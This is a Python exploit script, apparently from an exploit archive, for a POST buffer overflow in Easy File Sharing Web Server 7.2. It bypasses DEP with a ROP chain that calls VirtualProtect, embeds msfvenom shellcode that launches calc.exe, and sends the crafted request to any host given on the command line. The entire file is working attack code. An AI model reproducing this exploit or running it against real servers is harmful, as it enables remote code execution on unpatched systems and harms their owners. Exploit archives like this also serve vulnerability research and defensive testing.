#!/usr/bin/python

# Exploit Title: Easy File Sharing Web Server 7.2 - 'POST' Buffer Overflow (DEP Bypass with ROP)
# Exploit Author: bl4ck h4ck3r
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: Easy File Sharing Web Server v7.2
# Tested on: Windows XP SP2, Windows 2008 R2 x64

import socket
import struct
import sys

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <host>\n"
    exit()

# 0x1002280a :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
ret = struct.pack("<I", 0x1002280a)

# nopsled
shellcode = "\x90"*200

# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -v shellcode -f python
shellcode += "\x89\xe7\xd9\xec\xd9\x77\xf4\x5d\x55\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x39\x6c\x5a\x48\x6b\x32\x55\x50\x67\x70\x47\x70"
shellcode += "\x75\x30\x6e\x69\x78\x65\x65\x61\x39\x50\x31\x74"
shellcode += "\x4c\x4b\x50\x50\x46\x50\x4c\x4b\x36\x32\x36\x6c"
shellcode += "\x6c\x4b\x66\x32\x42\x34\x6c\x4b\x52\x52\x77\x58"
shellcode += "\x54\x4f\x4c\x77\x63\x7a\x31\x36\x66\x51\x4b\x4f"
shellcode += "\x4e\x4c\x47\x4c\x73\x51\x73\x4c\x76\x62\x76\x4c"
shellcode += "\x51\x30\x59\x51\x78\x4f\x46\x6d\x76\x61\x48\x47"
shellcode += "\x6a\x42\x79\x62\x50\x52\x50\x57\x4c\x4b\x63\x62"
shellcode += "\x36\x70\x4e\x6b\x30\x4a\x37\x4c\x6e\x6b\x42\x6c"
shellcode += "\x42\x31\x33\x48\x49\x73\x50\x48\x33\x31\x6a\x71"
shellcode += "\x42\x71\x4c\x4b\x63\x69\x47\x50\x45\x51\x4a\x73"
shellcode += "\x6c\x4b\x72\x69\x44\x58\x6b\x53\x67\x4a\x42\x69"
shellcode += "\x6e\x6b\x45\x64\x4c\x4b\x46\x61\x6b\x66\x35\x61"
shellcode += "\x39\x6f\x6c\x6c\x6b\x71\x58\x4f\x34\x4d\x46\x61"
shellcode += "\x6b\x77\x44\x78\x6d\x30\x71\x65\x59\x66\x64\x43"
shellcode += "\x61\x6d\x48\x78\x67\x4b\x61\x6d\x74\x64\x32\x55"
shellcode += "\x4d\x34\x42\x78\x6e\x6b\x32\x78\x44\x64\x56\x61"
shellcode += "\x68\x53\x62\x46\x4e\x6b\x36\x6c\x70\x4b\x4c\x4b"
shellcode += "\x56\x38\x35\x4c\x56\x61\x59\x43\x6c\x4b\x76\x64"
shellcode += "\x4c\x4b\x56\x61\x78\x50\x6e\x69\x61\x54\x37\x54"
shellcode += "\x55\x74\x53\x6b\x63\x6b\x63\x51\x32\x79\x71\x4a"
shellcode += "\x36\x31\x69\x6f\x4b\x50\x43\x6f\x31\x4f\x73\x6a"
shellcode += "\x6e\x6b\x36\x72\x58\x6b\x4c\x4d\x53\x6d\x52\x4a"
shellcode += "\x47\x71\x4c\x4d\x6f\x75\x48\x32\x43\x30\x53\x30"
shellcode += "\x67\x70\x32\x70\x31\x78\x34\x71\x4e\x6b\x32\x4f"
shellcode += "\x6c\x47\x39\x6f\x68\x55\x4f\x4b\x4c\x30\x68\x35"
shellcode += "\x4f\x52\x33\x66\x50\x68\x79\x36\x5a\x35\x6d\x6d"
shellcode += "\x4d\x4d\x49\x6f\x68\x55\x55\x6c\x76\x66\x53\x4c"
shellcode += "\x75\x5a\x6b\x30\x59\x6b\x59\x70\x72\x55\x33\x35"
shellcode += "\x6f\x4b\x37\x37\x76\x73\x74\x32\x70\x6f\x50\x6a"
shellcode += "\x67\x70\x50\x53\x59\x6f\x69\x45\x65\x33\x75\x31"
shellcode += "\x62\x4c\x61\x73\x46\x4e\x75\x35\x30\x78\x72\x45"
shellcode += "\x45\x50\x41\x41"

def create_rop_chain():
	
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
		# 0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0xFFFFFDFE,  # -202
		0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
		0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]|   {PAGE_EXECUTE_READ}
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x1004de84,  # &Writable location [ImageLoad.dll]

		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
		0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
		0x61c0a798,  # XCHG EAX,EDI # RETN [sqlite3.dll]
		0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll]
		0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll]
		0x100218f9,  # POP EBP # RETN [ImageLoad.dll]
		0x61c24169,  # & push esp # ret  [sqlite3.dll]
		0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
		0x1001bd98,  # POP ECX # RETN [ImageLoad.dll]
		0x1004de84,  # &Writable location [ImageLoad.dll]
		0x61c373a4,  # POP EDI # RETN [sqlite3.dll]
		0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
		0x10015442,  # POP EAX # RETN [ImageLoad.dll]
		0x90909090,  # nop
		0x100240c2,  # PUSHAD # RETN [ImageLoad.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
	
rop_chain = create_rop_chain()

buf = "A"*2278 + rop_chain + shellcode + "B"*(1794-len(shellcode)-len(rop_chain)) + ret

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send("POST /sendemail.ghp HTTP/1.1\r\n\r\nEmail=" + buf + "&getPassword=Get+Password")

s.close()